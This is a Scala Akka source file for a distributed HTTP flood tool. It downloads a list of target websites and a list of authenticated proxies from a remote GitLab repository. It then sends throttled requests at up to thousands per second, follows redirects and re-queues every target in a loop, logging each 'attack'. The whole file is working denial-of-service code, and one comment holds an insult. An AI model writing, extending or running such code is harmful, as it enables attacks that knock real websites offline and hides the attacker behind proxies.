package hi

import akka.actor.ActorSystem
import akka.http.scaladsl.model.headers.BasicHttpCredentials
import akka.http.scaladsl.model.{HttpRequest, HttpResponse, StatusCodes}
import akka.http.scaladsl.settings.ConnectionPoolSettings
import akka.http.scaladsl.{ClientTransport, Http}
import akka.stream.OverflowStrategy
import akka.stream.scaladsl._
import spray.json.DefaultJsonProtocol._
import spray.json._

import java.net.InetSocketAddress
import scala.concurrent.duration.DurationInt
import scala.concurrent.{ExecutionContextExecutor, Future}

object Main {


  case class Proxy(id: Int, ip: String, auth: String) {
    def getIp: String = ip.replace("\r", "").split(":").head

    def port: String = ip.replace("\r", "").split(":")(1)

    def login: String = auth.split(":").head

    def password: String = auth.split(":")(1)
  }

  case class Target(id: Int, url: String, need_parse_url: Int, page: String, page_time: String, atack: Int)

  implicit val proxyFormat: RootJsonFormat[Proxy] = jsonFormat3(Proxy)

  implicit object TargetJsonFormat extends RootJsonFormat[Target] {
    override def read(json: JsValue): Target = {
      json.asJsObject.getFields("id", "url", "need_parse_url", "page", "page_time", "atack") match {
        case Seq(JsNumber(id), JsString(url), JsNumber(need_parse_url), JsString(page), page_time, JsNumber(atack)) =>
          Target(id.toInt, url, need_parse_url.toInt, page, page_time.toString(), atack.toInt)
      }
    }

    override def write(obj: Target): JsValue = ???
  }


  def fetchProxies: Seq[Proxy] = {
    val source = scala.io.Source.fromURL("https://gitlab.com/cto.endel/atack_api/-/raw/master/proxy.json")
    try {
      source.mkString.replace("\\r", "").replaceAll("\\s+", "").parseJson.convertTo[Seq[Proxy]]

    } finally {
      source.close()
    }
  }

  def fetchTargets: Seq[Target] = {
    val source = scala.io.Source.fromURL("https://gitlab.com/cto.endel/atack_api/-/raw/master/sites.json")
    try {
      source.mkString.parseJson.convertTo[Seq[Target]]
    } finally {
      source.close()
    }
  }

  private def getProxy(proxy: Proxy)(implicit system: ActorSystem): ConnectionPoolSettings = {

    val proxyAddress = InetSocketAddress.createUnresolved(proxy.ip, proxy.port.toInt)
    val auth = BasicHttpCredentials(proxy.login, proxy.password)

    val httpsProxyTransport = ClientTransport.httpsProxy(proxyAddress, auth)

    ConnectionPoolSettings(system).withTransport(httpsProxyTransport)
  }

  case class WorkSite(url: String, currentProxy: Proxy, poolProxy: Seq[Proxy], lastTime: Long, isDown: Boolean) {
    def updateProxy(): WorkSite = WorkSite(url, poolProxy.head, poolProxy.tail :+ poolProxy.head, lastTime, isDown)

    def updateLastTime(): WorkSite = WorkSite(url, currentProxy, poolProxy, System.currentTimeMillis(), isDown)

    def updateLastStatus(status: Boolean): WorkSite = WorkSite(url, currentProxy, poolProxy, System.currentTimeMillis(), status)

    def updateUlr(newUrl: String): WorkSite = WorkSite(newUrl, currentProxy, poolProxy, System.currentTimeMillis(), isDown)
  }


  def main(args: Array[String]): Unit = {
    implicit val system: ActorSystem = ActorSystem()
    implicit val executionContext: ExecutionContextExecutor = system.dispatcher
    val (queue, aggregationSource) = Source
      .queue[WorkSite](2000, OverflowStrategy.dropTail)
      .throttle(2000, 500.millis)
      .filterNot(_.isDown)
      .preMaterialize()

    //    val updateList = Source(fetchUrls)
    //      .throttle(400, 5.minute)

    val redirection = Flow
      .fromFunction[WorkSite, (WorkSite, Future[HttpResponse])](w => {
        (w, Http().singleRequest(HttpRequest(uri = w.url.replace(" ", ""))))
      })
      .to(Sink
        .foreach(r => {
          val (workSite, response) = r
          response.map({
            case HttpResponse(StatusCodes.Redirection(_), headers, _, _) =>
              //println(s"[$intValue], $headers")
              println(s"attack -> ${workSite.url}")
              val link = headers.filter(ss => ss.name().equals("Location"))
              if (link.nonEmpty && link.head.value().startsWith("http") && link.head.value() != workSite.url) {
                queue.offer(workSite.updateLastStatus(false).updateUlr(link.head.value()))
              } else {
                queue.offer(workSite.updateLastStatus(false)) //updateProxy
              }

            case HttpResponse(StatusCodes.ServerError(_), _, _, _) =>
              //println(s"[$intValue], down pidarasy")
              queue.offer(workSite.updateLastStatus(false))
            case _ => queue.offer(workSite.updateLastStatus(false))
          })
        }))
    val proxy = fetchProxies
    val sites = fetchTargets.filter(_.atack > 0).map(t => WorkSite(t.url, proxy.head, proxy, System.currentTimeMillis(), isDown = true)).toList
    Source(sites)
      .via(
        Flow[WorkSite]
          .merge(aggregationSource)
          //          .merge(updateList)
          .wireTap(redirection)
      )
      .run()
  }
}
